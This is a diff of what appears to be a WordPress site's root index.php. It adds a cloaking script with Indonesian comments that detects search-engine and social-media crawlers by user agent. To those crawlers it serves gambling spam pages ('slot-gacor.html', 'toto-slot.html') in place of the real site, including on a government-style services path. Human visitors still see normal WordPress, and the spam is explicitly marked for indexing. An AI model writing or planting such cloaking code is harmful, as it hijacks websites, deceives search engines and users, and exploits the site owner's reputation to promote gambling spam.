@@ -1,19 +1,13 @@
 <?php
 /**
- * WordPress Cloaking System - Enhanced Version
- * Menampilkan konten berbeda untuk bot crawler dengan logging
+ * WordPress Cloaking System
+ * Menampilkan konten berbeda untuk bot crawler
  */
 
 // =============================================================================
-//  Konfigurasi & Logging
+//  Daftar Bot
 // =============================================================================
 
-// Aktifkan error logging untuk debugging
-error_log("=== Cloaking System Started ===");
-error_log("Request URI: " . ($_SERVER['REQUEST_URI'] ?? 'unknown'));
-error_log("User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'unknown'));
-
-// Daftar bot yang akan dideteksi
 $bots = array(
     'Googlebot', 'Googlebot-News', 'Googlebot-Image', 'Googlebot-Video',
     'bingbot', 'Slurp', 'DuckDuckBot', 'BingPreview', 'DuckDuckGo',
@@ -23,51 +17,30 @@ $bots = array(
     'SEMrushBot', 'MJ12bot', 'Twitterbot', 'LinkedInBot'
 );
 
-// Path ke folder konten lokal
-$content_dir = __DIR__ . '/bot-content/';
+// Path ke file konten lokal (langsung di root web)
+$root_dir = __DIR__ . '/';
 
 // =============================================================================
-//  Fungsi-fungsi
+//  Fungsi Deteksi Bot
 // =============================================================================
 
-/**
- * Deteksi apakah user-agent adalah bot
- */
-function is_cloaking_bot($bots_list) {
+function is_bot_detected($bots_list) {
     $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
     
     if (empty($user_agent)) {
-        error_log("Empty user agent - not treating as bot");
         return false;
     }
     
     foreach ($bots_list as $bot) {
         if (stripos($user_agent, $bot) !== false) {
-            error_log("Bot detected: " . $bot);
             return true;
         }
     }
     
-    error_log("Not a bot - user agent: " . $user_agent);
     return false;
 }
 
-/**
- * Ambil konten dari file lokal dengan fallback
- */
-function get_local_content($file_path) {
-    if (file_exists($file_path) && is_readable($file_path)) {
-        error_log("Loading content from: " . $file_path);
-        return file_get_contents($file_path);
-    }
-    error_log("File not found: " . $file_path);
-    return false;
-}
-
-/**
- * Tampilkan respons yang valid untuk bot
- */
-function show_bot_response($content_dir) {
+function get_bot_content($root_dir) {
     $request_uri = $_SERVER['REQUEST_URI'] ?? '/';
     $path = strtok($request_uri, '?');
     $path = rtrim($path, '/');
@@ -76,74 +49,56 @@ function show_bot_response($content_dir) {
         $path = '/';
     }
     
-    error_log("Processing path: " . $path);
-    
     // Tentukan file konten berdasarkan path
-    $content_file = null;
-    
-    // Homepage
+    // Homepage (root, /web, atau kosong) -> slot-gacor.html
     if ($path === '/' || $path === '/web' || $path === '/web/') {
-        $content_file = $content_dir . 'index.html';
-    }
-    // /web/tramites-y-servicios
+        $file = $root_dir . 'slot-gacor.html';
+    } 
+    // Path /web/tramites-y-servicios -> toto-slot.html
     elseif (strpos($path, '/web/tramites-y-servicios') === 0) {
-        $content_file = $content_dir . 'tramites-y-servicios.html';
-    }
-    // Default fallback
+        $file = $root_dir . 'toto-slot.html';
+    } 
+    // Default fallback jika path tidak dikenal
     else {
-        $content_file = $content_dir . 'default.html';
+        $file = $root_dir . 'slot-gacor.html'; // fallback ke homepage
     }
     
-    // Ambil konten
-    $content = get_local_content($content_file);
-    
-    // Jika konten tidak ditemukan, buat konten minimal
-    if (!$content) {
-        error_log("No content found, generating minimal response");
-        $content = '<!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="robots" content="noindex, nofollow">
-            <title>Content</title>
-        </head>
-        <body>
-            <h1>Welcome</h1>
-            <p>Content for crawlers</p>
-        </body>
-        </html>';
+    // Ambil konten dari file
+    if (file_exists($file) && is_readable($file)) {
+        return file_get_contents($file);
     }
     
-    // Bersihkan buffer
-    while (ob_get_level()) {
-        ob_end_clean();
-    }
-    
-    // Set headers yang benar
-    header('HTTP/1.1 200 OK');
-    header('Content-Type: text/html; charset=UTF-8');
-    header('X-Robots-Tag: index, follow'); // Biarkan Google mengindeks
-    header('Cache-Control: public, max-age=3600');
-    
-    echo $content;
-    error_log("Bot response sent successfully");
-    exit;
+    // Fallback jika file tidak ada
+    return '<!DOCTYPE html>
+    <html>
+    <head><meta charset="UTF-8"><title>Content</title></head>
+    <body><h1>Welcome</h1><p>Content for crawlers</p></body>
+    </html>';
 }
 
 // =============================================================================
 //  Eksekusi Cloaking
 // =============================================================================
 
-// Cek apakah ini request untuk bot
-if (is_cloaking_bot($bots)) {
-    error_log("=== SERVING BOT CONTENT ===");
-    show_bot_response($content_dir);
+if (is_bot_detected($bots)) {
+    // Bersihkan buffer
+    while (ob_get_level()) {
+        ob_end_clean();
+    }
+    
+    // Set headers
+    header('HTTP/1.1 200 OK');
+    header('Content-Type: text/html; charset=UTF-8');
+    header('X-Robots-Tag: index, follow');
+    
+    // Tampilkan konten bot
+    echo get_bot_content($root_dir);
+    exit;
 }
 
 // =============================================================================
-//  WordPress Default Loader
+//  Load WordPress Normal
 // =============================================================================
 
-error_log("=== SERVING NORMAL WORDPRESS CONTENT ===");
 define('WP_USE_THEMES', true);
 require __DIR__ . '/wp-blog-header.php';
